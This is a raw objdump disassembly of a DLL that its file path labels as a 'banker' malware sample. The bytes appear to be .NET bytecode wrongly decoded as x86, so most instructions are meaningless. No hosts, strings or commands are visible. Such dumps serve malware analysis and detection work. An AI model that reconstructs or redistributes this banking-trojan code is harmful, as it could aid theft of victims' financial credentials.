
malware_samples/banker/d80cc8fb6839fbd7f636ddb293c00a92afe8b2480609ff847047fe84653d4d53.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	10 8c 00 00 00 00 00 	adc    %cl,0x0(%eax,%eax,1)
10002007:	00 48 00             	add    %cl,0x0(%eax)
1000200a:	00 00                	add    %al,(%eax)
1000200c:	02 00                	add    (%eax),%al
1000200e:	05 00 6c 57 00       	add    $0x576c00,%eax
10002013:	00 6c 34 00          	add    %ch,0x0(%esp,%esi,1)
10002017:	00 01                	add    %al,(%ecx)
	...
1000204d:	00 00                	add    %al,(%eax)
1000204f:	00 9e 7e 01 00 00    	add    %bl,0x17e(%esi)
10002055:	04 2c                	add    $0x2c,%al
10002057:	17                   	pop    %ss
10002058:	16                   	push   %ss
10002059:	28 04 00             	sub    %al,(%eax,%eax,1)
1000205c:	00 06                	add    %al,(%esi)
1000205e:	26 02 03             	add    %es:(%ebx),%al
10002061:	28 01                	sub    %al,(%ecx)
10002063:	00 00                	add    %al,(%eax)
10002065:	06                   	push   %es
10002066:	26 17                	es pop %ss
10002068:	28 04 00             	sub    %al,(%eax,%eax,1)
1000206b:	00 06                	add    %al,(%esi)
1000206d:	26 2a 02             	sub    %es:(%edx),%al
10002070:	03 28                	add    (%eax),%ebp
10002072:	01 00                	add    %eax,(%eax)
10002074:	00 06                	add    %al,(%esi)
10002076:	26 2a 03             	sub    %es:(%ebx),%al
10002079:	30 05 00 47 00 00    	xor    %al,0x4700
1000207f:	00 00                	add    %al,(%eax)
10002081:	00 00                	add    %al,(%eax)
10002083:	00 7e 01             	add    %bh,0x1(%esi)
10002086:	00 00                	add    %al,(%eax)
10002088:	04 2c                	add    $0x2c,%al
1000208a:	27                   	daa
1000208b:	16                   	push   %ss
1000208c:	28 04 00             	sub    %al,(%eax,%eax,1)
1000208f:	00 06                	add    %al,(%esi)
10002091:	26 02 2c 0b          	add    %es:(%ebx,%ecx,1),%ch
10002095:	02 18                	add    (%eax),%bl
10002097:	2e 04 1f             	cs add $0x1f,%al
1000209a:	20 2b                	and    %ch,(%ebx)
1000209c:	04 1e                	add    $0x1e,%al
1000209e:	2b 01                	sub    (%ecx),%eax
100020a0:	18 16                	sbb    %dl,(%esi)
100020a2:	16                   	push   %ss
100020a3:	16                   	push   %ss
100020a4:	16                   	push   %ss
100020a5:	28 02                	sub    %al,(%edx)
100020a7:	00 00                	add    %al,(%eax)
100020a9:	06                   	push   %es
100020aa:	17                   	pop    %ss
100020ab:	28 04 00             	sub    %al,(%eax,%eax,1)
100020ae:	00 06                	add    %al,(%esi)
100020b0:	26 2a 02             	sub    %es:(%edx),%al
100020b3:	2c 0b                	sub    $0xb,%al
100020b5:	02 18                	add    (%eax),%bl
100020b7:	2e 04 1f             	cs add $0x1f,%al
100020ba:	20 2b                	and    %ch,(%ebx)
100020bc:	04 1e                	add    $0x1e,%al
100020be:	2b 01                	sub    (%ecx),%eax
100020c0:	18 16                	sbb    %dl,(%esi)
100020c2:	16                   	push   %ss
100020c3:	16                   	push   %ss
100020c4:	16                   	push   %ss
100020c5:	28 02                	sub    %al,(%edx)
100020c7:	00 00                	add    %al,(%eax)
100020c9:	06                   	push   %es
100020ca:	2a 00                	sub    (%eax),%al
100020cc:	03 30                	add    (%eax),%esi
100020ce:	05 00 49 00 00       	add    $0x4900,%eax
100020d3:	00 00                	add    %al,(%eax)
100020d5:	00 00                	add    %al,(%eax)
100020d7:	00 7e 01             	add    %bh,0x1(%esi)
100020da:	00 00                	add    %al,(%eax)
100020dc:	04 2c                	add    $0x2c,%al
100020de:	28 16                	sub    %dl,(%esi)
100020e0:	28 04 00             	sub    %al,(%eax,%eax,1)
100020e3:	00 06                	add    %al,(%esi)
100020e5:	26 02 2c 0c          	add    %es:(%esp,%ecx,1),%ch
100020e9:	02 18                	add    (%eax),%bl
100020eb:	2e 04 1f             	cs add $0x1f,%al
100020ee:	40                   	inc    %eax
100020ef:	2b 05 1f 10 2b 01    	sub    0x12b101f,%eax
100020f5:	1a 16                	sbb    (%esi),%dl
100020f7:	16                   	push   %ss
100020f8:	16                   	push   %ss
100020f9:	16                   	push   %ss
100020fa:	28 02                	sub    %al,(%edx)
100020fc:	00 00                	add    %al,(%eax)
100020fe:	06                   	push   %es
100020ff:	17                   	pop    %ss
10002100:	28 04 00             	sub    %al,(%eax,%eax,1)
10002103:	00 06                	add    %al,(%esi)
10002105:	26 2a 02             	sub    %es:(%edx),%al
10002108:	2c 0c                	sub    $0xc,%al
1000210a:	02 18                	add    (%eax),%bl
1000210c:	2e 04 1f             	cs add $0x1f,%al
1000210f:	40                   	inc    %eax
10002110:	2b 05 1f 10 2b 01    	sub    0x12b101f,%eax
10002116:	1a 16                	sbb    (%esi),%dl
10002118:	16                   	push   %ss
10002119:	16                   	push   %ss
1000211a:	16                   	push   %ss
1000211b:	28 02                	sub    %al,(%edx)
1000211d:	00 00                	add    %al,(%eax)
1000211f:	06                   	push   %es
10002120:	2a ce                	sub    %dh,%cl
10002122:	7e 01                	jle    0x10002125
10002124:	00 00                	add    %al,(%eax)
10002126:	04 2c                	add    $0x2c,%al
10002128:	1d 16 28 04 00       	sbb    $0x42816,%eax
1000212d:	00 06                	add    %al,(%esi)
1000212f:	26 20 00             	and    %al,%es:(%eax)
10002132:	08 00                	or     %al,(%eax)
10002134:	00 16                	add    %dl,(%esi)
10002136:	16                   	push   %ss
10002137:	02 16                	add    (%esi),%dl
10002139:	28 02                	sub    %al,(%edx)
1000213b:	00 00                	add    %al,(%eax)
1000213d:	06                   	push   %es
1000213e:	17                   	pop    %ss
1000213f:	28 04 00             	sub    %al,(%eax,%eax,1)
10002142:	00 06                	add    %al,(%esi)
10002144:	26 2a 20             	sub    %es:(%eax),%ah
10002147:	00 08                	add    %cl,(%eax)
10002149:	00 00                	add    %al,(%eax)
1000214b:	16                   	push   %ss
1000214c:	16                   	push   %ss
1000214d:	02 16                	add    (%esi),%dl
1000214f:	28 02                	sub    %al,(%edx)
10002151:	00 00                	add    %al,(%eax)
10002153:	06                   	push   %es
10002154:	2a a6 7e 01 00 00    	sub    0x17e(%esi),%ah
1000215a:	04 2c                	add    $0x2c,%al
1000215c:	18 16                	sbb    %dl,(%esi)
1000215e:	28 04 00             	sub    %al,(%eax,%eax,1)
10002161:	00 06                	add    %al,(%esi)
10002163:	26 02 16             	add    %es:(%esi),%dl
10002166:	16                   	push   %ss
10002167:	16                   	push   %ss
10002168:	28 03                	sub    %al,(%ebx)
1000216a:	00 00                	add    %al,(%eax)
1000216c:	06                   	push   %es
1000216d:	17                   	pop    %ss
1000216e:	28 04 00             	sub    %al,(%eax,%eax,1)
10002171:	00 06                	add    %al,(%esi)
10002173:	26 2a 02             	sub    %es:(%edx),%al
10002176:	16                   	push   %ss
10002177:	16                   	push   %ss
10002178:	16                   	push   %ss
10002179:	28 03                	sub    %al,(%ebx)
1000217b:	00 00                	add    %al,(%eax)
1000217d:	06                   	push   %es
1000217e:	2a a6 7e 01 00 00    	sub    0x17e(%esi),%ah
10002184:	04 2c                	add    $0x2c,%al
10002186:	18 16                	sbb    %dl,(%esi)
10002188:	28 04 00             	sub    %al,(%eax,%eax,1)
1000218b:	00 06                	add    %al,(%esi)
1000218d:	26 02 16             	add    %es:(%esi),%dl
10002190:	18 16                	sbb    %dl,(%esi)
10002192:	28 03                	sub    %al,(%ebx)
10002194:	00 00                	add    %al,(%eax)
10002196:	06                   	push   %es
10002197:	17                   	pop    %ss
10002198:	28 04 00             	sub    %al,(%eax,%eax,1)
1000219b:	00 06                	add    %al,(%esi)
1000219d:	26 2a 02             	sub    %es:(%edx),%al
100021a0:	16                   	push   %ss
100021a1:	18 16                	sbb    %dl,(%esi)
100021a3:	28 03                	sub    %al,(%ebx)
100021a5:	00 00                	add    %al,(%eax)
100021a7:	06                   	push   %es
100021a8:	2a 3a                	sub    (%edx),%bh
100021aa:	17                   	pop    %ss
100021ab:	28 04 00             	sub    %al,(%eax,%eax,1)
100021ae:	00 06                	add    %al,(%esi)
100021b0:	26 17                	es pop %ss
100021b2:	80 01 00             	addb   $0x0,(%ecx)
100021b5:	00 04 2a             	add    %al,(%edx,%ebp,1)
100021b8:	3a 16                	cmp    (%esi),%dl
100021ba:	28 04 00             	sub    %al,(%eax,%eax,1)
100021bd:	00 06                	add    %al,(%esi)
100021bf:	26 16                	es push %ss
100021c1:	80 01 00             	addb   $0x0,(%ecx)
100021c4:	00 04 2a             	add    %al,(%edx,%ebp,1)
100021c7:	06                   	push   %es
100021c8:	2a 1e                	sub    (%esi),%bl
100021ca:	02 28                	add    (%eax),%ch
100021cc:	05 00 00 0a 2a       	add    $0x2a0a0000,%eax
100021d1:	00 00                	add    %al,(%eax)
100021d3:	00 13                	add    %dl,(%ebx)
100021d5:	30 09                	xor    %cl,(%ecx)
100021d7:	00 63 00             	add    %ah,0x0(%ebx)
100021da:	00 00                	add    %al,(%eax)
100021dc:	01 00                	add    %eax,(%eax)
100021de:	00 11                	add    %dl,(%ecx)
100021e0:	7e 06                	jle    0x100021e8
100021e2:	00 00                	add    %al,(%eax)
100021e4:	0a 28                	or     (%eax),%ch
100021e6:	0f 00 00             	sldt   (%eax)
100021e9:	06                   	push   %es
100021ea:	0a 06                	or     (%esi),%al
100021ec:	28 11                	sub    %dl,(%ecx)
100021ee:	00 00                	add    %al,(%eax)
100021f0:	06                   	push   %es
100021f1:	0b 06                	or     (%esi),%eax
100021f3:	02 03                	add    (%ebx),%al
100021f5:	28 12                	sub    %dl,(%edx)
100021f7:	00 00                	add    %al,(%eax)
100021f9:	06                   	push   %es
100021fa:	0c 07                	or     $0x7,%al
100021fc:	08 28                	or     %ch,(%eax)
100021fe:	13 00                	adc    (%eax),%eax
10002200:	00 06                	add    %al,(%esi)
10002202:	0d 07 16 16 02       	or     $0x2161607,%eax
10002207:	03 06                	add    (%esi),%eax
10002209:	16                   	push   %ss
1000220a:	16                   	push   %ss
1000220b:	20 20                	and    %ah,(%eax)
1000220d:	00 cc                	add    %cl,%ah
1000220f:	40                   	inc    %eax
10002210:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002213:	00 06                	add    %al,(%esi)
10002215:	26 07                	es pop %es
10002217:	09 28                	or     %ebp,(%eax)
10002219:	13 00                	adc    (%eax),%eax
1000221b:	00 06                	add    %al,(%esi)
1000221d:	26 07                	es pop %es
1000221f:	28 16                	sub    %dl,(%esi)
10002221:	00 00                	add    %al,(%eax)
10002223:	06                   	push   %es
10002224:	26 7e 06             	es jle 0x1000222d
10002227:	00 00                	add    %al,(%eax)
10002229:	0a 06                	or     (%esi),%al
1000222b:	28 10                	sub    %dl,(%eax)
1000222d:	00 00                	add    %al,(%eax)
1000222f:	06                   	push   %es
10002230:	26 08 28             	or     %ch,%es:(%eax)
10002233:	07                   	pop    %es
10002234:	00 00                	add    %al,(%eax)
10002236:	0a 13                	or     (%ebx),%dl
10002238:	04 08                	add    $0x8,%al
1000223a:	28 15 00 00 06 26    	sub    %dl,0x26060000
10002240:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
10002243:	1e                   	push   %ds
10002244:	02 28                	add    (%eax),%ch
10002246:	05 00 00 0a 2a       	add    $0x2a0a0000,%eax
1000224b:	00 1b                	add    %bl,(%ebx)
1000224d:	30 03                	xor    %al,(%ebx)
1000224f:	00 59 00             	add    %bl,0x0(%ecx)
10002252:	00 00                	add    %al,(%eax)
10002254:	02 00                	add    (%eax),%al
10002256:	00 11                	add    %dl,(%ecx)
10002258:	28 19                	sub    %bl,(%ecx)
1000225a:	00 00                	add    %al,(%eax)
1000225c:	06                   	push   %es
1000225d:	0a 06                	or     (%esi),%al
1000225f:	7e 06                	jle    0x10002267
10002261:	00 00                	add    %al,(%eax)
10002263:	0a 28                	or     (%eax),%ch
10002265:	08 00                	or     %al,(%eax)
10002267:	00 0a                	add    %cl,(%edx)
10002269:	2c 08                	sub    $0x8,%al
1000226b:	72 01                	jb     0x1000226e
1000226d:	00 00                	add    %al,(%eax)
1000226f:	70 0d                	jo     0x1000227e
10002271:	de 3c 06             	fidivrs (%esi,%eax,1)
10002274:	28 1b                	sub    %bl,(%ebx)
10002276:	00 00                	add    %al,(%eax)
10002278:	06                   	push   %es
10002279:	0b 07                	or     (%edi),%eax
1000227b:	16                   	push   %ss
1000227c:	30 08                	xor    %cl,(%eax)
1000227e:	72 01                	jb     0x10002281
10002280:	00 00                	add    %al,(%eax)
10002282:	70 0d                	jo     0x10002291
10002284:	de 29                	fisubrs (%ecx)
10002286:	07                   	pop    %es
10002287:	17                   	pop    %ss
10002288:	58                   	pop    %eax
10002289:	73 09                	jae    0x10002294
1000228b:	00 00                	add    %al,(%eax)
1000228d:	0a 0c 06             	or     (%esi,%eax,1),%cl
10002290:	08 08                	or     %cl,(%eax)
10002292:	6f                   	outsl  %ds:(%esi),(%dx)
10002293:	0a 00                	or     (%eax),%al
10002295:	00 0a                	add    %cl,(%edx)
10002297:	28 1a                	sub    %bl,(%edx)
10002299:	00 00                	add    %al,(%eax)
1000229b:	06                   	push   %es
1000229c:	26 08 6f 0b          	or     %ch,%es:0xb(%edi)
100022a0:	00 00                	add    %al,(%eax)
100022a2:	0a 0d de 09 26 72    	or     0x722609de,%cl
100022a8:	01 00                	add    %eax,(%eax)
100022aa:	00 70 0d             	add    %dh,0xd(%eax)
100022ad:	de 00                	fiadds (%eax)
100022af:	09 2a                	or     %ebp,(%edx)
100022b1:	00 00                	add    %al,(%eax)
100022b3:	00 01                	add    %al,(%ecx)
100022b5:	10 00                	adc    %al,(%eax)
100022b7:	00 00                	add    %al,(%eax)
100022b9:	00 00                	add    %al,(%eax)
100022bb:	00 4e 4e             	add    %cl,0x4e(%esi)
100022be:	00 09                	add    %cl,(%ecx)
100022c0:	01 00                	add    %eax,(%eax)
100022c2:	00 01                	add    %al,(%ecx)
100022c4:	1b 30                	sbb    (%eax),%esi
100022c6:	02 00                	add    (%eax),%al
100022c8:	4a                   	dec    %edx
100022c9:	00 00                	add    %al,(%eax)
100022cb:	00 03                	add    %al,(%ebx)
100022cd:	00 00                	add    %al,(%eax)
100022cf:	11 28                	adc    %ebp,(%eax)
100022d1:	19 00                	sbb    %eax,(%eax)
100022d3:	00 06                	add    %al,(%esi)
100022d5:	0a 06                	or     (%esi),%al
100022d7:	7e 06                	jle    0x100022df
100022d9:	00 00                	add    %al,(%eax)
100022db:	0a 28                	or     (%eax),%ch
100022dd:	08 00                	or     %al,(%eax)
100022df:	00 0a                	add    %cl,(%edx)
100022e1:	2c 08                	sub    $0x8,%al
100022e3:	72 01                	jb     0x100022e6
100022e5:	00 00                	add    %al,(%eax)
100022e7:	70 0c                	jo     0x100022f5
100022e9:	de 2d 16 0b 06 12    	fisubrs 0x12060b16
100022ef:	01 28                	add    %ebp,(%eax)
100022f1:	1c 00                	sbb    $0x0,%al
100022f3:	00 06                	add    %al,(%esi)
100022f5:	26 07                	es pop %es
100022f7:	2d 08 72 01 00       	sub    $0x17208,%eax
100022fc:	00 70 0c             	add    %dh,0xc(%eax)
100022ff:	de 17                	ficoms (%edi)
10002301:	07                   	pop    %es
10002302:	28 0c 00             	sub    %cl,(%eax,%eax,1)
10002305:	00 0a                	add    %cl,(%edx)
10002307:	6f                   	outsl  %ds:(%esi),(%dx)
10002308:	0d 00 00 0a 0c       	or     $0xc0a0000,%eax
1000230d:	de 09                	fimuls (%ecx)
1000230f:	26 72 01             	es jb  0x10002313
10002312:	00 00                	add    %al,(%eax)
10002314:	70 0c                	jo     0x10002322
10002316:	de 00                	fiadds (%eax)
10002318:	08 2a                	or     %ch,(%edx)
1000231a:	00 00                	add    %al,(%eax)
1000231c:	01 10                	add    %edx,(%eax)
1000231e:	00 00                	add    %al,(%eax)
10002320:	00 00                	add    %al,(%eax)
10002322:	00 00                	add    %al,(%eax)
10002324:	3f                   	aas
10002325:	3f                   	aas
10002326:	00 09                	add    %cl,(%ecx)
10002328:	01 00                	add    %eax,(%eax)
1000232a:	00 01                	add    %al,(%ecx)
1000232c:	1e                   	push   %ds
1000232d:	02 28                	add    (%eax),%ch
1000232f:	05 00 00 0a 2a       	add    $0x2a0a0000,%eax
10002334:	13 30                	adc    (%eax),%esi
10002336:	03 00                	add    (%eax),%eax
10002338:	61                   	popa
10002339:	00 00                	add    %al,(%eax)
1000233b:	00 04 00             	add    %al,(%eax,%eax,1)
1000233e:	00 11                	add    %dl,(%ecx)
10002340:	fe                   	(bad)
10002341:	13 7e 08             	adc    0x8(%esi),%edi
10002344:	00 00                	add    %al,(%eax)
10002346:	04 2c                	add    $0x2c,%al
10002348:	01 2a                	add    %ebp,(%edx)
1000234a:	17                   	pop    %ss
1000234b:	fe                   	(bad)
1000234c:	13 80 08 00 00 04    	adc    0x4000008(%eax),%eax
10002352:	16                   	push   %ss
10002353:	0a 2b                	or     (%ebx),%ch
10002355:	0c 7e                	or     $0x7e,%al
10002357:	04 00                	add    $0x0,%al
10002359:	00 04 06             	add    %al,(%esi,%eax,1)
1000235c:	16                   	push   %ss
1000235d:	9c                   	pushf
1000235e:	06                   	push   %es
1000235f:	17                   	pop    %ss
10002360:	58                   	pop    %eax
10002361:	0a 06                	or     (%esi),%al
10002363:	20 00                	and    %al,(%eax)
10002365:	01 00                	add    %eax,(%eax)
10002367:	00 32                	add    %dh,(%edx)
10002369:	ec                   	in     (%dx),%al
1000236a:	14 fe                	adc    $0xfe,%al
1000236c:	06                   	push   %es
1000236d:	24 00                	and    $0x0,%al
1000236f:	00 06                	add    %al,(%esi)
10002371:	73 0e                	jae    0x10002381
10002373:	00 00                	add    %al,(%eax)
10002375:	0a 73 0f             	or     0xf(%ebx),%dh
10002378:	00 00                	add    %al,(%eax)
1000237a:	0a 80 07 00 00 04    	or     0x4000007(%eax),%al
10002380:	7e 07                	jle    0x10002389
10002382:	00 00                	add    %al,(%eax)
10002384:	04 17                	add    $0x17,%al
10002386:	6f                   	outsl  %ds:(%esi),(%dx)
10002387:	10 00                	adc    %al,(%eax)
10002389:	00 0a                	add    %cl,(%edx)
1000238b:	7e 07                	jle    0x10002394
1000238d:	00 00                	add    %al,(%eax)
1000238f:	04 1a                	add    $0x1a,%al
10002391:	6f                   	outsl  %ds:(%esi),(%dx)
10002392:	11 00                	adc    %eax,(%eax)
10002394:	00 0a                	add    %cl,(%edx)
10002396:	7e 07                	jle    0x1000239f
10002398:	00 00                	add    %al,(%eax)
1000239a:	04 6f                	add    $0x6f,%al
1000239c:	12 00                	adc    (%eax),%al
1000239e:	00 0a                	add    %cl,(%edx)
100023a0:	2a 00                	sub    (%eax),%al
100023a2:	00 00                	add    %al,(%eax)
100023a4:	0b 30                	or     (%eax),%esi
100023a6:	02 00                	add    (%eax),%al
100023a8:	2b 00                	sub    (%eax),%eax
100023aa:	00 00                	add    %al,(%eax)
100023ac:	00 00                	add    %al,(%eax)
100023ae:	00 00                	add    %al,(%eax)
100023b0:	16                   	push   %ss
100023b1:	fe                   	(bad)
100023b2:	13 80 08 00 00 04    	adc    0x4000008(%eax),%eax
100023b8:	7e 07                	jle    0x100023c1
100023ba:	00 00                	add    %al,(%eax)
100023bc:	04 2c                	add    $0x2c,%al
100023be:	1b 7e 07             	sbb    0x7(%esi),%edi
100023c1:	00 00                	add    %al,(%eax)
100023c3:	04 20                	add    $0x20,%al
100023c5:	c8 00 00 00          	enter  $0x0,$0x0
100023c9:	6f                   	outsl  %ds:(%esi),(%dx)
100023ca:	13 00                	adc    (%eax),%eax
100023cc:	00 0a                	add    %cl,(%edx)
100023ce:	26 de 03             	fiadds %es:(%ebx)
100023d1:	26 de 00             	fiadds %es:(%eax)
100023d4:	14 80                	adc    $0x80,%al
100023d6:	07                   	pop    %es
100023d7:	00 00                	add    %al,(%eax)
100023d9:	04 2a                	add    $0x2a,%al
100023db:	00 01                	add    %al,(%ecx)
100023dd:	10 00                	adc    %al,(%eax)
100023df:	00 00                	add    %al,(%eax)
100023e1:	00 0f                	add    %cl,(%edi)
100023e3:	00 12                	add    %dl,(%edx)
100023e5:	21 00                	and    %eax,(%eax)
100023e7:	03 01                	add    (%ecx),%eax
100023e9:	00 00                	add    %al,(%eax)
100023eb:	01 1b                	add    %ebx,(%ebx)
100023ed:	30 03                	xor    %al,(%ebx)
100023ef:	00 d2                	add    %dl,%dl
100023f1:	00 00                	add    %al,(%eax)
100023f3:	00 05 00 00 11 16    	add    %al,0x16110000
100023f9:	0a 38                	or     (%eax),%bh
100023fb:	be 00 00 00 7e       	mov    $0x7e000000,%esi
10002400:	09 00                	or     %eax,(%eax)
10002402:	00 04 13             	add    %al,(%ebx,%edx,1)
10002405:	06                   	push   %es
10002406:	16                   	push   %ss
10002407:	13 07                	adc    (%edi),%eax
10002409:	38 8e 00 00 00 11    	cmp    %cl,0x11000000(%esi)
1000240f:	06                   	push   %es
10002410:	11 07                	adc    %eax,(%edi)
10002412:	94                   	xchg   %eax,%esp
10002413:	0b 07                	or     (%edi),%eax
10002415:	28 20                	sub    %ah,(%eax)
10002417:	00 00                	add    %al,(%eax)
10002419:	06                   	push   %es
1000241a:	20 00                	and    %al,(%eax)
1000241c:	80 00 00             	addb   $0x0,(%eax)
1000241f:	5f                   	pop    %edi
10002420:	16                   	push   %ss
10002421:	fe 01                	incb   (%ecx)
10002423:	16                   	push   %ss
10002424:	fe 01                	incb   (%ecx)
10002426:	0c 7e                	or     $0x7e,%al
10002428:	04 00                	add    $0x0,%al
1000242a:	00 04 07             	add    %al,(%edi,%eax,1)
1000242d:	90                   	nop
1000242e:	0d 08 2c 5c 09       	or     $0x95c2c08,%eax
10002433:	2d 59 07 28 26       	sub    $0x26280759,%eax
10002438:	00 00                	add    %al,(%eax)
1000243a:	06                   	push   %es
1000243b:	13 04 11             	adc    (%ecx,%edx,1),%eax
1000243e:	04 28                	add    $0x28,%al
10002440:	14 00                	adc    $0x0,%al
10002442:	00 0a                	add    %cl,(%edx)
10002444:	2d 48 16 13 05       	sub    $0x5131648,%eax
10002449:	7e 06                	jle    0x10002451
1000244b:	00 00                	add    %al,(%eax)
1000244d:	04 25                	add    $0x25,%al
1000244f:	13 08                	adc    (%eax),%ecx
10002451:	12 05 28 15 00 00    	adc    0x1528,%al
10002457:	0a 7e 05             	or     0x5(%esi),%bh
1000245a:	00 00                	add    %al,(%eax)
1000245c:	04 11                	add    $0x11,%al
1000245e:	04 6f                	add    $0x6f,%al
10002460:	16                   	push   %ss
10002461:	00 00                	add    %al,(%eax)
10002463:	0a 7e 05             	or     0x5(%esi),%bh
10002466:	00 00                	add    %al,(%eax)
10002468:	04 6f                	add    $0x6f,%al
1000246a:	17                   	pop    %ss
1000246b:	00 00                	add    %al,(%eax)
1000246d:	0a 20                	or     (%eax),%ah
1000246f:	d0 07                	rolb   $1,(%edi)
10002471:	00 00                	add    %al,(%eax)
10002473:	31 0b                	xor    %ecx,(%ebx)
10002475:	7e 05                	jle    0x1000247c
10002477:	00 00                	add    %al,(%eax)
10002479:	04 6f                	add    $0x6f,%al
1000247b:	18 00                	sbb    %al,(%eax)
1000247d:	00 0a                	add    %cl,(%edx)
1000247f:	26 de 0c 11          	fimuls %es:(%ecx,%edx,1)
10002483:	05 2c 07 11 08       	add    $0x811072c,%eax
10002488:	28 19                	sub    %bl,(%ecx)
1000248a:	00 00                	add    %al,(%eax)
1000248c:	0a dc                	or     %ah,%bl
1000248e:	7e 04                	jle    0x10002494
10002490:	00 00                	add    %al,(%eax)
10002492:	04 07                	add    $0x7,%al
10002494:	08 9c 11 07 17 58 13 	or     %bl,0x13581707(%ecx,%edx,1)
1000249b:	07                   	pop    %es
1000249c:	11 07                	adc    %eax,(%edi)
1000249e:	11 06                	adc    %eax,(%esi)
100024a0:	8e 69 3f             	mov    0x3f(%ecx),%gs
100024a3:	67 ff                	addr16 (bad)
100024a5:	ff                   	(bad)
100024a6:	ff 06                	incl   (%esi)
100024a8:	17                   	pop    %ss
100024a9:	58                   	pop    %eax
100024aa:	0a 06                	or     (%esi),%al
100024ac:	1f                   	pop    %ds
100024ad:	64 32 08             	xor    %fs:(%eax),%cl
100024b0:	16                   	push   %ss
100024b1:	0a 17                	or     (%edi),%dl
100024b3:	28 1a                	sub    %bl,(%edx)
100024b5:	00 00                	add    %al,(%eax)
100024b7:	0a de                	or     %dh,%bl
100024b9:	03 26                	add    (%esi),%esp
100024bb:	de 00                	fiadds (%eax)
100024bd:	fe                   	(bad)
100024be:	13 7e 08             	adc    0x8(%esi),%edi
100024c1:	00 00                	add    %al,(%eax)
100024c3:	04 3a                	add    $0x3a,%al
100024c5:	36 ff                	ss (bad)
100024c7:	ff                   	(bad)
100024c8:	ff 2a                	ljmp   *(%edx)
100024ca:	00 00                	add    %al,(%eax)
100024cc:	01 1c 00             	add    %ebx,(%eax,%eax,1)
100024cf:	00 02                	add    %al,(%edx)
100024d1:	00 51 00             	add    %dl,0x0(%ecx)
100024d4:	39 8a 00 0c 00 00    	cmp    %ecx,0xc00(%edx)
100024da:	00 00                	add    %al,(%eax)
100024dc:	00 00                	add    %al,(%eax)
100024de:	07                   	pop    %es
100024df:	00 bb c2 00 03 01    	add    %bh,0x10300c2(%ebx)
100024e5:	00 00                	add    %al,(%eax)
100024e7:	01 1b                	add    %ebx,(%ebx)
100024e9:	30 03                	xor    %al,(%ebx)
100024eb:	00 a6 00 00 00 06    	add    %ah,0x6000000(%esi)
100024f1:	00 00                	add    %al,(%eax)
100024f3:	11 7e 09             	adc    %edi,0x9(%esi)
100024f6:	00 00                	add    %al,(%eax)
100024f8:	04 13                	add    $0x13,%al
100024fa:	05 16 13 06 38       	add    $0x38061316,%eax
100024ff:	8b 00                	mov    (%eax),%eax
10002501:	00 00                	add    %al,(%eax)
10002503:	11 05 11 06 94 0a    	adc    %eax,0xa940611
10002509:	06                   	push   %es
1000250a:	28 20                	sub    %ah,(%eax)
1000250c:	00 00                	add    %al,(%eax)
1000250e:	06                   	push   %es
1000250f:	20 00                	and    %al,(%eax)
10002511:	80 00 00             	addb   $0x0,(%eax)
10002514:	5f                   	pop    %edi
10002515:	16                   	push   %ss
10002516:	fe 01                	incb   (%ecx)
10002518:	16                   	push   %ss
10002519:	fe 01                	incb   (%ecx)
1000251b:	0b 7e 04             	or     0x4(%esi),%edi
1000251e:	00 00                	add    %al,(%eax)
10002520:	04 06                	add    $0x6,%al
10002522:	90                   	nop
10002523:	0c 07                	or     $0x7,%al
10002525:	2c 59                	sub    $0x59,%al
10002527:	08 2d 56 06 28 26    	or     %ch,0x26280656
1000252d:	00 00                	add    %al,(%eax)
1000252f:	06                   	push   %es
10002530:	0d 09 28 14 00       	or     $0x142809,%eax
10002535:	00 0a                	add    %cl,(%edx)
10002537:	2d 47 16 13 04       	sub    $0x4131647,%eax
1000253c:	7e 06                	jle    0x10002544
1000253e:	00 00                	add    %al,(%eax)
10002540:	04 25                	add    $0x25,%al
10002542:	13 07                	adc    (%edi),%eax
10002544:	12 04 28             	adc    (%eax,%ebp,1),%al
10002547:	15 00 00 0a 7e       	adc    $0x7e0a0000,%eax
1000254c:	05 00 00 04 09       	add    $0x9040000,%eax
10002551:	6f                   	outsl  %ds:(%esi),(%dx)
10002552:	16                   	push   %ss
10002553:	00 00                	add    %al,(%eax)
10002555:	0a 7e 05             	or     0x5(%esi),%bh
10002558:	00 00                	add    %al,(%eax)
1000255a:	04 6f                	add    $0x6f,%al
1000255c:	17                   	pop    %ss
1000255d:	00 00                	add    %al,(%eax)
1000255f:	0a 20                	or     (%eax),%ah
10002561:	d0 07                	rolb   $1,(%edi)
10002563:	00 00                	add    %al,(%eax)
10002565:	31 0b                	xor    %ecx,(%ebx)
10002567:	7e 05                	jle    0x1000256e
10002569:	00 00                	add    %al,(%eax)
1000256b:	04 6f                	add    $0x6f,%al
1000256d:	18 00                	sbb    %al,(%eax)
1000256f:	00 0a                	add    %cl,(%edx)
10002571:	26 de 0c 11          	fimuls %es:(%ecx,%edx,1)
10002575:	04 2c                	add    $0x2c,%al
10002577:	07                   	pop    %es
10002578:	11 07                	adc    %eax,(%edi)
1000257a:	28 19                	sub    %bl,(%ecx)
1000257c:	00 00                	add    %al,(%eax)
1000257e:	0a dc                	or     %ah,%bl
10002580:	7e 04                	jle    0x10002586
10002582:	00 00                	add    %al,(%eax)
10002584:	04 06                	add    $0x6,%al
10002586:	07                   	pop    %es
10002587:	9c                   	pushf
10002588:	11 06                	adc    %eax,(%esi)
1000258a:	17                   	pop    %ss
1000258b:	58                   	pop    %eax
1000258c:	13 06                	adc    (%esi),%eax
1000258e:	11 06                	adc    %eax,(%esi)
10002590:	11 05 8e 69 3f 6a    	adc    %eax,0x6a3f698e
10002596:	ff                   	(bad)
10002597:	ff                   	(bad)
10002598:	ff 2a                	ljmp   *(%edx)
1000259a:	00 00                	add    %al,(%eax)
1000259c:	01 10                	add    %edx,(%eax)
1000259e:	00 00                	add    %al,(%eax)
100025a0:	02 00                	add    (%eax),%al
100025a2:	48                   	dec    %eax
100025a3:	00 38                	add    %bh,(%eax)
100025a5:	80 00 0c             	addb   $0xc,(%eax)
100025a8:	00 00                	add    %al,(%eax)
100025aa:	00 00                	add    %al,(%eax)
100025ac:	13 30                	adc    (%eax),%esi
100025ae:	03 00                	add    (%eax),%eax
100025b0:	5e                   	pop    %esi
100025b1:	02 00                	add    (%eax),%al
100025b3:	00 07                	add    %al,(%edi)
100025b5:	00 00                	add    %al,(%eax)
100025b7:	11 1f                	adc    %ebx,(%edi)
100025b9:	10 28                	adc    %ch,(%eax)
100025bb:	21 00                	and    %eax,(%eax)
100025bd:	00 06                	add    %al,(%esi)
100025bf:	20 00                	and    %al,(%eax)
100025c1:	80 00 00             	addb   $0x0,(%eax)
100025c4:	5f                   	pop    %edi
100025c5:	16                   	push   %ss
